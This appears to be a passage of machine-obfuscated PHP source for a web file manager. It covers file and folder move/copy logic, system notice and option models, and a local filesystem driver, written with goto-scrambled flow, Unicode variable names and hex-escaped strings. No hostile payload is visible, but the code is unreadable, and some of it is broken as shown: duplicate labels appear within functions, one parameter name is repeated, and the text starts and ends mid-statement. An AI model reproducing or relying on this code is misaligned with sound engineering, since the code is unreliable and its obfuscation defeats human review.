array($DպÔ[385] => $d팩, $DպÔ[89] => $DպÔ[431], $DպÔ[366] => Pinyin::encode($cڜϲ, $DպÔ[546])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($dͧ) { goto eɗ; dɆ: $d = array_to_keyvalue($d, $cО[385]); foreach ($d as $cҊ) { $fȭۓ = $cҊ[$cО[478]]; $dͧ = $cҊ[$cО[385]]; if (!isset($this->_childrenListCache[$dͧ]) && $cҊ[$cО[386]] == $cО[83]) { $this->_childrenListCache[$dͧ] = array(); } if (!isset($this->_childrenListCache[$fȭۓ])) { $this->_childrenListCache[$fȭۓ] = array(); } $this->_childrenListCache[$fȭۓ][$dͧ] = $cҊ; $this->_childrenItemCache[$dͧ] = $cҊ; } goto aޏ; Dӧ: $C = array($cО[476] => array($cО[500], $D酼[$cО[476]] . $dͧ . $cО[501]), $cО[413] => $this->targetIsDelete); $d = $this->field($E®̾)->where($C)->select(); if (!$d) { return; } goto dɆ; eɗ: $cО =& $_SERVER[Ť]; $D酼 = $this->sourceInfo($dͧ); $E®̾ = $cО[414]; goto Dӧ; aޏ: } private function _childrenListAll($bи, &$Aӈ) { $aǭ =& $_SERVER[Ť]; if (!isset($this->_childrenListCache[$bи])) { return; } $B䮶 = $this->_childrenListCache[$bи]; foreach ($B䮶 as $bΆ => $C͌) { $Aӈ[$bΆ] = $C͌; if ($C͌[$aǭ[386]] == $aǭ[83]) { $this->_childrenListAll($bΆ, $Aӈ); } } } private function sourceInfoCache($Fԏ) { if (isset($this->_childrenItemCache[$Fԏ])) { return $this->_childrenItemCache[$Fԏ]; } return $this->sourceInfo($Fԏ); } private function _childrenList($DК) { if (isset($this->_childrenListCache[$DК])) { return $this->_childrenListCache[$DК]; } return $this->_childrenListSelect($DК); } private function _childrenListSelect($bɈ) { goto f; f: $Cҹ =& $_SERVER[Ť]; $D = array($Cҹ[478] => $bɈ, $Cҹ[413] => $this->targetIsDelete); $C = $this->where($D)->select(); goto fՕ; FҮ: foreach ($fبȽ as $bɈ => $d鍩) { $this->_childrenItemCache[$bɈ] = $d鍩; } return $fبȽ; goto c; fՕ: $C = $C ? $C : array(); $fبȽ = array_to_keyvalue($C, $Cҹ[385]); $this->_childrenListCache[$bɈ] = $fبȽ; goto FҮ; c: } private function fileNameExistCache($eͩ, $dθ) { $Cך̴ =& $_SERVER[Ť]; $dθ = strtolower($dθ); $f = $this->_childrenList($eͩ); foreach ($f as $Eٽ) { if ($dθ == strtolower($Eٽ[$Cך̴[28]])) { return $Eٽ[$Cך̴[385]]; } } return !1; } private function fileNameAutoCache($d, $dٍ, $cꐢ, $Dὅ) { $d݅У =& $_SERVER[Ť]; $aɟ = $this->_childrenList($d); $B = array_to_keyvalue($aɟ, $d݅У[33], $d݅У[28]); return $this->fileNameAutoGet($B, $dٍ, $cꐢ, $Dὅ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($E雍, $cڧ, $C٩ = REPEAT_REPLACE, $ẻሙ = '') { goto F; B⤟: if ($A˙Ї[$dð[478]] == $aȂ[$dð[385]]) { if ($A˙Ї[$dð[413]] == $dð[83]) { Model($dð[411])->restore(array($E雍)); } if (!$ẻሙ || $ẻሙ == $A˙Ї[$dð[28]]) { return $E雍; } } $bɋ = $this->pathInfoMore($E雍); if ($this->isParentOf($E雍, $cڧ)) { return !1; } goto A쏛; eн: $Dꒇ = $this->fileNameExistCache($cڧ, $A˙Ї[$dð[28]]); $d = $this->_move($E雍, $cڧ, $C٩, $C޺׌, $ẻሙ); $this->sourceCacheClear(); goto dƈ魔; dƈ魔: if ($A˙Ї[$dð[386]] == $dð[83] && $Dꒇ) { $this->folderSizeResetChildren($d); } Model($dð[171])->linkAdd($C޺׌[$dð[518]]); if ($Dꒇ && $C޺׌[$dð[549]]) { $this->removeNow($E雍, !1); } goto B߫; F: $dð =& $_SERVER[Ť]; $A˙Ї = $this->sourceInfo($E雍); $aȂ = $this->sourceInfo($cڧ); goto B⤟; CΜۥ: if ($A˙Ї[$dð[478]] == $cڧ && $ẻሙ != $A˙Ї[$dð[28]]) { $Eɹ = $this->fileNameExist($cڧ, $ẻሙ); if ($Eɹ && $A˙Ї[$dð[386]] == $dð[485]) { goto eۮ; d: $this->removeNow($E雍, !1); $this->folderSizeReset($cڧ); Hook::trigger($dð[548], $bɋ); goto cۅ; cۅ: return $Eɹ; goto B握; eۮ: $FЙ = $this->sourceInfo($Eɹ); $f = $this->fileHistory($FЙ, $A˙Ї[$dð[435]], $A˙Ї[$dð[77]]); if (!$f) { Model($dð[438])->remove($A˙Ї[$dð[435]]); } goto d; B握: } } $B = $ẻሙ ? $ẻሙ : $A˙Ї[$dð[28]]; $this->lockMoveStart($E雍); goto fƩ; B߫: $this->lockMoveEnd($E雍); $this->lockWriteEnd($cڧ, $B); $this->folderSizeReset($A˙Ї[$dð[478]]); goto aɊ; A쏛: if (!$A˙Ї || !$aȂ || $aȂ[$dð[386]] != $dð[83]) { return !1; } Hook::trigger($dð[547], $bɋ); $this->targetIsDelete = intval($A˙Ї[$dð[413]]); goto CΜۥ; B۔: return $d; goto AЃ; fƩ: $this->lockWriteStart($cڧ, $B); $C޺׌ = array($dð[518] => array(), $dð[549] => !1); $this->clearShare($E雍, $cڧ); goto eн; aɊ: $this->folderSizeReset($cڧ); $EĲ߫ = array($A˙Ї[$dð[478]], $cڧ); if ($A˙Ї[$dð[386]] == $dð[83]) { $EĲ߫[] = $E雍; } goto d롏ؓ; d롏ؓ: $this->updateModifyTime($EĲ߫); Model($dð[522])->eventMove($E雍, $A˙Ї[$dð[478]], $cڧ); Hook::trigger($dð[548], $bɋ); goto B۔; AЃ: } private function _move($DٞŻ, $f, $Aٵ, &$c, $d԰ = '') { goto Aб֎; dÜ: $this->lockWriteStart($f, $a); if (!$dܮ) { return $this->_moveForce($DٞŻ, $f, $a); } $F = $dܮ; goto B; aִ߳: return $F; goto FС׏; Cʘ: $a = $d԰ ? $d԰ : $Aۜ[$Bڦ[28]]; $dܮ = $this->fileNameExistCache($f, $a); $this->lockMoveStart($DٞŻ); goto dÜ; Aб֎: $Bڦ =& $_SERVER[Ť]; $Aۜ = $this->sourceInfo($DٞŻ); $Bꖩ = $Aۜ[$Bڦ[386]] == $Bڦ[83]; goto Cʘ; B: $Eי = !1; if ($Bꖩ) { if ($Aٵ == REPEAT_RENAME_FOLDER) { $a = $this->fileNameAuto($f, $a, $Aٵ, $Bꖩ); $F = $this->_moveForce($DٞŻ, $f, $a); } else { if ($Aٵ == REPEAT_RENAME_FOLDER) { $Aٵ = REPEAT_RENAME; } $D؞ = $this->_childrenListSelect($DٞŻ); foreach ($D؞ as $cݭ) { $this->_move($cݭ[$Bڦ[385]], $dܮ, $Aٵ, $c); } $Eי = !0; } } else { if ($Aٵ == REPEAT_SKIP) { $Eי = !0; } else { if ($Aٵ == REPEAT_RENAME || $Aٵ == REPEAT_RENAME_FOLDER) { $a = $this->fileNameAuto($f, $a, $Aٵ, $Bꖩ); $F = $this->_moveForce($DٞŻ, $f, $a); } else { if ($Aٵ == REPEAT_REPLACE) { $Cޯ = $this->sourceInfoCache($dܮ); $E݌ɷ = $this->fileHistory($Cޯ, $Aۜ[$Bڦ[435]], $Aۜ[$Bڦ[77]]); if ($E݌ɷ) { $c[$Bڦ[518]][] = $Aۜ[$Bڦ[435]]; } else { $Eי = !0; } } } } } if ($Eי && !$c[$Bڦ[549]]) { $c[$Bڦ[549]] = !0; } goto aִ߳; FС׏: } private function _moveForce($Cŝ, $dǋ, $a) { goto Cᄖ; Cᄖ: $Aȱ© =& $_SERVER[Ť]; $a״Ѝ = $this->sourceInfo($Cŝ); $A = $this->sourceInfo($dǋ); goto A; a: if (!$d쵓փ) { Model($Aȱ©[471])->authClear($Cŝ); } $B = $a״Ѝ[$Aȱ©[413]] == $Aȱ©[83] && $A[$Aȱ©[413]] != $Aȱ©[83]; if ($B) { $c慦[$Aȱ©[412]] = 0; } goto dǎ; A: $b = $a״Ѝ[$Aȱ©[386]] == $Aȱ©[83]; $c慦 = array($Aȱ©[384] => $A[$Aȱ©[385]], $Aȱ©[542] => $A[$Aȱ©[476]] . $A[$Aȱ©[385]] . $Aȱ©[47], $Aȱ©[538] => $A[$Aȱ©[387]], $Aȱ©[539] => $A[$Aȱ©[473]], $Aȱ©[541] => USER_ID, $Aȱ©[402] => $a); $d쵓փ = $a״Ѝ[$Aȱ©[387]] == SourceModel::TYPE_GROUP && $A[$Aȱ©[387]] == SourceModel::TYPE_GROUP && $a״Ѝ[$Aȱ©[473]] == $A[$Aȱ©[473]]; goto a; dǎ: if ($b) { $Fą = array($Aȱ©[542] => array($Aȱ©[500], $a״Ѝ[$Aȱ©[476]] . $a״Ѝ[$Aȱ©[385]] . $Aȱ©[501])); $e՝ = $a״Ѝ[$Aȱ©[476]] . $a״Ѝ[$Aȱ©[385]] . $Aȱ©[47]; $Fٓ = $A[$Aȱ©[476]] . $A[$Aȱ©[385]] . $Aȱ©[47] . $a״Ѝ[$Aȱ©[385]] . $Aȱ©[47]; $B = array($Aȱ©[542] => array($Aȱ©[550], "\162\x65\x70\x6c\x61\143\145\50\160\141\x72\145\x6e\164\114\145\x76\x65\x6c\x2c\x27{$e՝}\47\x2c\x27{$Fٓ}\47\x29"), $Aȱ©[538] => $A[$Aȱ©[387]], $Aȱ©[539] => $A[$Aȱ©[473]]); if ($B) { $B[$Aȱ©[412]] = 0; } $this->where($Fą)->data($B)->save(); } $this->where(array($Aȱ©[399] => $Cŝ))->data($c慦)->save(); return $Cŝ; goto FܬŸ; FܬŸ: } private function clearShare($E쓃, $aኘ) { goto E; E: $b =& $_SERVER[Ť]; $C = $this->sourceInfo($E쓃); $b۾ = $this->sourceInfo($aኘ); goto aГ݃; b晋: if (!$Eᥪ) { return; } $dΨ = array($b[385] => array($b[7], $Eᥪ), $b[463] => 1); $a߿ = Model($b[552])->field($b[456])->where($dΨ)->select(); goto b; b: if (!$a߿) { return; } $a߿ = array_to_keyvalue($a߿, $b[33], $b[456]); $dΨ = array($b[456] => array($b[7], $a߿)); goto B徭; aГ݃: if ($C[$b[473]] == $b۾[$b[473]] && $C[$b[387]] == $b[551]) { return; } $dΨ = array($b[476] => array($b[500], $C[$b[476]] . $E쓃 . $b[501])); $Eᥪ = $this->field($b[399])->where($dΨ)->getField($b[385], !0); goto b晋; B徭: Model($b[552])->where($dΨ)->save(array($b[463] => 0)); Model($b[553])->where($dΨ)->delete(); goto Dġ; Dġ: } public function copyFolderFromIO($Cㅒ, $cЇ, $a˷, $f, $f, $D = false) { goto B; Fӌ: Model($fү[521])->addAll($E㺊[$fү[519]], array(), !0); Model($fү[522])->eventCopy($c劅); $this->saveAll($E㺊[$fү[520]]); goto F˰; F˰: Model($fү[438])->linkAdd($E㺊[$fү[518]]); Model($fү[438])->remove($E㺊[$fү[554]]); $this->folderSizeReset($a˷); goto C; C: $this->updateModifyTime($a˷); return $c劅; goto C; e: if ($e) { $this->_childrenAllMake($e); } Hook::trigger($fү[555]); $this->_copyChildTo($Cㅒ, $cЇ, $c劅, $f, $E㺊, $f); goto C۠; C۠: Hook::trigger($fү[556]); if ($c劅) { $this->folderSizeResetChildren($c劅); } $this->_childrenListClear(); goto Fӌ; B: $fү =& $_SERVER[Ť]; $E㺊 = array($fү[519] => array(), $fү[520] => array(), $fү[518] => array(), $fү[554] => array()); $Bָ = $D ? $D : $Cㅒ->pathThis($cЇ); goto a񦳆ݗ; a񦳆ݗ: $e = $this->fileNameExist($a˷, $Bָ); $c劅 = $this->mkdir($a˷, $Bָ, $f); if (!$e || $f == REPEAT_RENAME_FOLDER) { $f = !1; } goto e; C: } private function _copyChildTo($f還, $BҌ߾, $e, $Fϊ޷, &$A, $bζ) { goto e; e: $Aկ =& $_SERVER[Ť]; $A = $this->sourceInfoCache($e); $aÑ = $f還->listPath($BҌ߾); goto e; Aʣ: foreach ($eޙ as &$Bķ) { goto aǞ; a: if ($Fϊ޷) { $Cظ = $this->fileNameExistCache($e, $Bķ[$Aկ[28]]); if ($Cظ) { if ($Bķ[$Aկ[386]] || $Fϊ޷ == REPEAT_SKIP) { continue; } if ($Fϊ޷ == REPEAT_REPLACE) { $b֮ = $this->sourceInfoCache($Cظ); $AȎ = $this->fileHistory($b֮, $Bķ[$Aկ[435]], $Bķ[$Aկ[77]]); if ($AȎ) { $A[$Aկ[518]][] = $Bķ[$Aկ[435]]; } continue; } else { if ($Fϊ޷ == REPEAT_RENAME) { $Bķ[$Aկ[28]] = $this->fileNameAutoCache($e, $Bķ[$Aկ[28]], $Fϊ޷, !1); } } } } if (!$Bķ[$Aկ[386]] && $Bķ[$Aկ[435]]) { $A[$Aկ[518]][] = $Bķ[$Aկ[435]]; } $B˨䧴[] = $this->_makeItemData($Bķ, $A, $Bķ[$Aկ[28]]); goto f; aǞ: if (isset($A[$Bķ[$Aկ[28]]])) { $Bķ = $A[$Bķ[$Aկ[28]]]; } $Bķ[$Aկ[386]] = $Bķ[$Aկ[29]] == $Aկ[76]; $Bķ[$Aկ[388]] = _get($Bķ, $Aկ[165], $Aկ[33]); goto fթ; fթ: $Bķ[$Aկ[77]] = _get($Bķ, $Aկ[77], 0); $Bķ[$Aկ[435]] = _get($Bķ, $Aկ[435], 0); if (!isset($Bķ[$Aկ[557]]) && $Bķ[$Aկ[435]]) { $A[$Aկ[554]][] = $Bķ[$Aկ[435]]; } goto a; f: } unset($Bķ); if (!empty($B˨䧴)) { $this->addAll($B˨䧴); } goto c; c: $AЩ = $this->_childrenList($e); $AЩ = array_to_keyvalue($AЩ, $Aկ[28]); foreach ($eޙ as $Bķ) { $b֮ = $AЩ[$Bķ[$Aկ[28]]]; $Cʹ = $b֮[$Aկ[385]]; $this->_copyApplyMeta($b֮, $A); if ($Bķ[$Aկ[29]] == $Aկ[76]) { $Bķ[$Aկ[75]] = $f還->getPathInner($Bķ[$Aկ[75]]); $this->_copyChildTo($f還, $Bķ[$Aկ[75]], $Cʹ, $Fϊ޷, $A, $bζ); } } goto Dͼ焟; e: $eޙ = array_merge($aÑ[$Aկ[73]], $aÑ[$Aկ[74]]); $A = $this->_addFiles($f還, $aÑ[$Aկ[73]], $bζ); $B˨䧴 = array(); goto Aʣ; Dͼ焟: } private function _addFiles($Bƨڛ, $fԩԂ, $F㋍) { goto f呛; f呛: $D鍮 =& $_SERVER[Ť]; if (!$fԩԂ || count($fԩԂ) == 0) { return array(); } $E = array(); goto fپǻ; fپǻ: foreach ($fԩԂ as &$e) { goto b; Eͫ: $Dǡ = $Bƨڛ->hashMd5($e[$D鍮[75]]); if (strlen($Dǡ) > 10 && !isset($E[$Dǡ])) { $E[$Dǡ] = array(); } $e[$D鍮[168]] = $dદ; goto Dܼ; c: if (count($E[$Dǡ]) > 1) { $e[$D鍮[557]] = !0; } goto a; b: Hook::trigger($D鍮[558], $e); $e[$D鍮[75]] = $Bƨڛ->getPathInner($e[$D鍮[75]]); $dદ = $Bƨڛ->hashSimple($e[$D鍮[75]]); goto Eͫ; Dܼ: $e[$D鍮[167]] = $Dǡ; Hook::trigger($D鍮[559], $e); $E[$Dǡ][] =& $e; goto c; a: } unset($e); $bޯТ = array($D鍮[167] => array($D鍮[7], array_keys($E))); goto fթ; fթ: $ař = Model($D鍮[560]); $e = $ař->where($bޯТ)->select(); $e = $e ? $e : array(); goto CǴɘ; CǴɘ: foreach ($e as $e) { if (!isset($E[$e[$D鍮[167]]])) { continue; } $EȐ = $E[$e[$D鍮[167]]]; foreach ($EȐ as &$e) { $e[$D鍮[435]] = $e[$D鍮[435]]; $e[$D鍮[557]] = !0; } unset($e); } $Eم = array(); foreach ($fԩԂ as $Dۼ͊) { if (isset($Dۼ͊[$D鍮[557]]) && $Dۼ͊[$D鍮[557]]) { continue; } $f˨ = $Bƨڛ->getPathInner($Dۼ͊[$D鍮[75]]); $B = $ař->addFileMake($f˨, $Dۼ͊[$D鍮[77]], $Dۼ͊[$D鍮[168]], $Dۼ͊[$D鍮[167]], $Dۼ͊[$D鍮[28]], $F㋍); $Eم[] = $B; } goto b; b: $ař->addAll($Eم); $bޯТ = array($D鍮[167] => array($D鍮[7], array_keys($E))); $e = $ař->where($bޯТ)->select(); goto CĬ; bΜ: foreach ($fԩԂ as $a늌) { $E[$a늌[$D鍮[28]]] = $a늌; } return $E; goto A𽼑ۇ; CĬ: $e = $e ? $e : array(); foreach ($e as $e) { if (!isset($E[$e[$D鍮[167]]])) { continue; } $bԓ =& $E[$e[$D鍮[167]]]; foreach ($bԓ as &$e) { $e[$D鍮[435]] = $e[$D鍮[435]]; } unset($e); } $E = array(); goto bΜ; A𽼑ۇ: } } define($_SERVER[Ť][561], $_SERVER[Ť][562]); goto eϵ; B: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\156\x6f\x74\x69\143\x65\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\143\157\156\x74\x65\x6e\x74", "\141\x75\164\x68", "\155\157\144\x65", "\x74\151\155\x65", "\x74\x79\x70\145", "\154\145\166\145\x6c", "\145\156\x61\142\154\x65", "\163\157\x72\164"); public function listData($E = false, $EƝ = "\163\157\x72\x74", $FҬ = false) { return parent::listData($E, $EƝ, $FҬ); } public function add($d蠌) { $aի =& $_SERVER[Ť]; $f = time(); if ($d蠌[$aի[12]] == $aի[2055]) { $f = strtotime($d蠌[$aի[193]]); } $d蠌[$aի[193]] = $f; return parent::insert($d蠌); } public function update($fՎ, $d) { goto A꿼ƥ; C: $b⮙ = time(); if ($d[$fȆ[12]] == $fȆ[2055]) { $b⮙ = strtotime($d[$fȆ[193]]); } $d[$fȆ[193]] = $b⮙; goto fϒ; fϒ: return parent::update($fՎ, $d); goto a߼; A꿼ƥ: $fȆ =& $_SERVER[Ť]; $aƆ޶ = $this->listData($fՎ); if (!$aƆ޶) { return !1; } goto C; a߼: } public function remove($EբƢˋ) { $cڮ = $this->listData($EբƢˋ); if (!$cڮ || $cڮ[$_SERVER[Ť][1136]]) { return !1; } return parent::remove($EբƢˋ); } public function sort($a, $dÌ) { return parent::update($a, $dÌ); } public function enable($DЎ, $F) { return parent::update($DЎ, array($_SERVER[Ť][2056] => $F)); } private function initUserOption() { $b =& $_SERVER[Ť]; $this->optionType = $b[2057]; $this->modelType = $b[2058]; $this->field = array($b[2059], $b[28], $b[193], $b[29], $b[2060], $b[699], $b[187]); } public function userNoticeGet($CӅ = false) { $this->initUserOption(); return parent::listData($CӅ, $_SERVER[Ť][383], !0); } public function userNoticeAdd($bЂ) { $dҏ =& $_SERVER[Ť]; $this->initUserOption(); $dяѢ = $this->findByKey($dҏ[2059], $bЂ[$dҏ[383]]); if ($dяѢ) { return !0; } $C = array($dҏ[2059] => $bЂ[$dҏ[383]], $dҏ[28] => $bЂ[$dҏ[28]], $dҏ[193] => $bЂ[$dҏ[193]], $dҏ[29] => isset($bЂ[$dҏ[29]]) ? $bЂ[$dҏ[29]] : 1, $dҏ[2060] => isset($bЂ[$dҏ[2060]]) ? $bЂ[$dҏ[2060]] : 0, $dҏ[699] => 0, $dҏ[187] => 0); return parent::insert($C); } public function userNoticeEdit($e߯, $dʓ) { $this->initUserOption(); return parent::update($e߯, $dʓ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\x6d\x5f\x6f\x70\164\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\162\157\154\x65", "\162\157\x6c\145\x47\x72\x6f\165\x70", "\162\145\x67\151\x73\x74", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Bߗ) { return "\x53\x79\x73\164\x65\155\x4f\x70\164\x69\157\156\137{$Bߗ}"; } protected function optionDefault($eҊ = '') { $C䬎̾ =& $_SERVER[Ť]; if ($eҊ == $C䬎̾[33]) { return $GLOBALS[$C䬎̾[6]][$C䬎̾[371]]; } } } class SystemRecordModel extends ModelBaseLight { } goto B; EȌ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($f) { if (substr($f, 0, 2) == $_SERVER[Ť][1210]) { $f = BASIC_PATH . substr($f, 2); } return $f; } public function iconvApp($Cﺓ) { $c񍗒 =& $_SERVER[Ť]; global $config; return $this->iconvTo($Cﺓ, $config[$c񍗒[1208]], $config[$c񍗒[1207]]); } public function iconvSystem($c) { $f񎪔 =& $_SERVER[Ť]; global $config; return $this->iconvTo($c, $config[$f񎪔[1207]], $config[$f񎪔[1208]]); } public function getPathOuter($a옽) { goto fՃ培; eѪ: $a옽 = KodIO::clear($a옽); $a옽 = substr($a옽, strlen($Aڊ)); if (empty($this->pathDriver)) { return $a옽; } goto aً; fՃ培: $b͗ =& $_SERVER[Ť]; $Aڊ = $this->iconvApp($this->pathBase); $a옽 = $this->iconvApp($a옽); goto D; D: if (substr($Aڊ, 0, 2) == $b͗[1210]) { $Aڊ = BASIC_PATH . substr($Aڊ, 2); } if (substr($a옽, 0, 2) == $b͗[1210]) { $a옽 = BASIC_PATH . substr($a옽, 2); } $Aڊ = KodIO::clear($Aڊ); goto eѪ; aً: return $this->pathDriver . $b͗[8] . ltrim($a옽, $b͗[8]); goto c; c: } public function mkfile($BƑ, $D = '', $aҏ = REPEAT_RENAME) { $BƑ = $this->iconvSystem($BƑ); @touch($BƑ); if ($D) { file_put_contents($BƑ, $D); } return is_file($BƑ) ? $this->getPathOuter($BƑ) : !1; } public function mkdir($Eܙ, $eΒ = REPEAT_SKIP) { $Eܙ = $this->iconvSystem($Eܙ); if (is_dir($Eܙ)) { return $this->getPathOuter($Eܙ); } @mkdir($Eܙ, 511, !0); return is_dir($Eܙ) ? $this->getPathOuter($Eܙ) : !1; } public function copyFile($e, $e̻) { $this->mkdir($this->pathFather($e̻)); $e = $this->iconvSystem($e); $e̻ = $this->iconvSystem($e̻); $b򚕄 = copy_64($e, $e̻); return $b򚕄 ? $this->getPathOuter($e̻) : !1; } public function moveFile($dׯ, $Eȇ͏) { $this->mkdir($this->pathFather($Eȇ͏)); $dׯ = $this->iconvSystem($dׯ); $Eȇ͏ = $this->iconvSystem($Eȇ͏); $C̃ = intval(@rename($dׯ, $Eȇ͏)); if (!$C̃) { if ($C̃ = intval(@copy_64($dׯ, $Eȇ͏))) { @unlink($dׯ); } } return $C̃ ? $this->getPathOuter($Eȇ͏) : !1; } public function delFile($D) { $D = $this->iconvSystem($D); if (!@unlink($D)) { @chmod($D, 511); if (!@unlink($D)) { return !1; } } else { return !0; } } public function delFolder($a) { goto fÎ; Aݥߌ: return rmdir($a); goto C; fÎ: $A饕 =& $_SERVER[Ť]; $a = $this->iconvSystem($a); if (!is_dir($a)) { return !0; } goto F̳; F̳: if (!($C = opendir($a))) { return !1; } while (($cҏ = readdir($C)) !== !1) { if ($cҏ == $A饕[91] || $cҏ == $A饕[1217]) { continue; } $D = $a . $A饕[8] . $cҏ; if (is_file($D) || is_link($D)) { if (!unlink($D)) { chmod($D, 511); if (!unlink($D)) { return !1; } } } else { if (is_dir($D)) { chmod($D, 511); $D = $this->iconvApp($D); if (!$this->delFolder($D)) { return !1; } } } } closedir($C); goto Aݥߌ; C: } public function rename($c؊Օ, $FɈ) { goto DŽ; Eƍ: $c؊Օ = $this->iconvSystem($c؊Օ); $Dн = $this->pathFather($c؊Օ); $e竧 = rtrim($Dн, $B[8]) . $B[8] . $B; goto B͌; DŽ: $B =& $_SERVER[Ť]; $B = $this->fileNameAuto($this->pathFather($c؊Օ), $FɈ); $B = $this->iconvSystem($B); goto Eƍ; B͌: $d = @rename($c؊Օ, $e竧); $e竧 = $this->iconvApp($e竧); return $d ? $this->getPathOuter($e竧) : !1; goto Eʹ; Eʹ: } public function size($D) { $D = $this->iconvSystem($D); return filesize_64($D); } public function info($dے) { $dے = $this->iconvSystem($dے); if ($this->isFolder($dے)) { return $this->folderInfo($dے); } else { if ($this->isFile($dے)) { return $this->fileInfo($dے); } } return !1; } protected function infoChildren($C, &$Cβޘا, $ẻ݊ = true) { goto aР; C: if ($ẻ݊) { $C = $this->iconvSystem($C); } if (!($d = @opendir($C))) { return; } while (($B = readdir($d)) !== !1) { if ($B == $Cߞ﫜[91] || $B == $Cߞ﫜[1217]) { continue; } $C򄩃 = $C . $B; if (is_file($C򄩃) || is_link($C򄩃)) { $Cβޘا[$Cߞ﫜[78]]++; $Cβޘا[$Cߞ﫜[77]] += filesize_64($C򄩃); } else { if (is_dir($C򄩃)) { $Cβޘا[$Cߞ﫜[79]]++; $this->infoChildren($C򄩃, $Cβޘا, !1); } } } goto b; b: closedir($d); goto CҶ; aР: $Cߞ﫜 =& $_SERVER[Ť]; check_abort_echo(); $C = rtrim($C, $Cߞ﫜[8]) . $Cߞ﫜[8]; goto C; CҶ: } private function folderInfo($D靲, $Aǎی = false) { $CҘ =& $_SERVER[Ť]; $D靲 = rtrim($D靲, $CҘ[8]) . $CҘ[8]; $c = $this->iconvApp($this->pathThis($D靲)); if ($Aǎی) { return array($CҘ[28] => $c, $CҘ[75] => $this->getPathOuter($D靲), $CҘ[29] => $CҘ[76]); } $fȏ = array($CҘ[28] => $c, $CҘ[75] => $this->getPathOuter($D靲), $CҘ[29] => $CҘ[76], $CҘ[190] => @filectime($D靲), $CҘ[107] => @filemtime($D靲), $CҘ[1220] => @fileatime($D靲), $CҘ[1221] => is_readable($D靲), $CҘ[1222] => is_writable($D靲), $CҘ[1223] => get_mode($D靲)); return $fȏ; } private function fileInfo($b՗, $fչ = false) { $A㖥ɘ =& $_SERVER[Ť]; $Bͷߕȹ = $this->iconvApp($this->pathThis($b՗)); if ($fչ) { return array($A㖥ɘ[28] => $Bͷߕȹ, $A㖥ɘ[75] => $this->getPathOuter($b՗), $A㖥ɘ[29] => $A㖥ɘ[171], $A㖥ɘ[77] => $this->size($b՗), $A㖥ɘ[165] => $this->ext($Bͷߕȹ)); } $D = array($A㖥ɘ[28] => $Bͷߕȹ, $A㖥ɘ[75] => $this->getPathOuter($b՗), $A㖥ɘ[29] => $A㖥ɘ[171], $A㖥ɘ[190] => @filectime($b՗), $A㖥ɘ[107] => @filemtime($b՗), $A㖥ɘ[1220] => @fileatime($b՗), $A㖥ɘ[77] => $this->size($b՗), $A㖥ɘ[165] => $this->ext($Bͷߕȹ), $A㖥ɘ[1221] => is_readable($b՗), $A㖥ɘ[1222] => is_writable($b՗), $A㖥ɘ[1223] => get_mode($b՗)); return $D; } public function exist($aﴎ) { $aﴎ = $this->iconvSystem($aﴎ); return @file_exists($aﴎ); } public function isFile($eϏٛ) { $eϏٛ = $this->iconvSystem($eϏٛ); return @is_file($eϏٛ); } public function isFolder($A) { $A = $this->iconvSystem($A); return @is_dir($A); } public function listPath($d砃, $F˪ = false) { goto F桙; d: closedir($Bʢ); return $CԌ; goto d¼; F桙: $b =& $_SERVER[Ť]; $d砃 = $this->iconvSystem($d砃); $d砃 = rtrim($d砃, $b[8]) . $b[8]; goto c; c: $CԌ = array($b[74] => array(), $b[73] => array()); if (!($Bʢ = @opendir($d砃))) { return $CԌ; } while (($f݄ = readdir($Bʢ)) !== !1) { if ($f݄ == $b[91] || $f݄ == $b[1217]) { continue; } $B툖 = $d砃 . $f݄; if (is_file($B툖)) { $CԌ[$b[73]][] = $this->fileInfo($B툖, $F˪); } else { $CԌ[$b[74]][] = $this->folderInfo($B툖, $F˪); } } goto d; d¼: } public function listAll($c, &$f՚Ώ = array()) { goto f龍; f龍: $fݍ =& $_SERVER[Ť]; $c = $this->iconvSystem($c); $c = rtrim($c, $fݍ[8]) . $fݍ[8]; goto d凉; D: return $f՚Ώ; goto a煂; d凉: if (!($cĆ = @opendir($c))) { return $f՚Ώ; } while (($b؃ = readdir($cĆ)) !== !1) { if ($b؃ == $fݍ[91] || $b؃ == $fݍ[1217]) { continue; } $A = $c . $b؃; if (is_dir($A) && !is_link($A)) { $f՚Ώ[] = array($fݍ[75] => $A . $fݍ[8], $fݍ[76] => 1, $fݍ[107] => @filemtime($A), $fݍ[77] => 0); $this->listAll($A, $f՚Ώ); } else { $f՚Ώ[] = array($fݍ[75] => $A, $fݍ[76] => 0, $fݍ[107] => @filemtime($A), $fݍ[77] => $this->size($A)); } } closedir($cĆ); goto D; a煂: } public function has($D׺, $d = false, $aٽ = true) { goto b˧; b˧: $B =& $_SERVER[Ť]; $D׺ = $this->iconvSystem($D׺); $D׺ = rtrim($D׺, $B[8]) . $B[8]; goto f狌; Bء: if ($d) { return array($B[199] => $F, $B[200] => $D); } return !1; goto b؝; f狌: if (!($F屲׵ = @opendir($D׺))) { return !1; } $F = 0; $D = 0; goto e̓ޛ; e̓ޛ: $a𰅓 = 0; while (($FĆ = readdir($F屲׵)) !== !1) { if ($FĆ == $B[91] || $FĆ == $B[1217]) { continue; } $Bޞ = $D׺ . $FĆ; if ($d) { $a𰅓++; if (@is_file($Bޞ)) { $F++; } else { $D++; } if ($a𰅓 > 10000) { break; } continue; } if ($aٽ) { if (@is_file($Bޞ)) { return !0; } } else { if (@is_dir($Bޞ . $B[8])) { return !0; } } } closedir($F屲׵); goto Bء; b؝: } public function hashSimple($dؙ) { goto dɛ釕; f،: $c = fopen($dؙ, $c𒓂[1224]); if (!$c) { return $a; } for ($cĄ = 0; $cĄ < $BΗ; $cĄ++) { fseek_64($c, $a * $cĄ); $a .= fread($c, $A镊); } goto dЋ; b쪹: return md5($a) . $b䴛; goto eݒ; b: $b䴛 = $this->size($dؙ); $A镊 = 200; $BΗ = 50; goto a; dɛ釕: $c𒓂 =& $_SERVER[Ť]; if (!$dؙ) { return md5($c𒓂[33]); } $dؙ = $this->iconvSystem($dؙ); goto b; a: if ($b䴛 <= $A镊 * $BΗ) { return 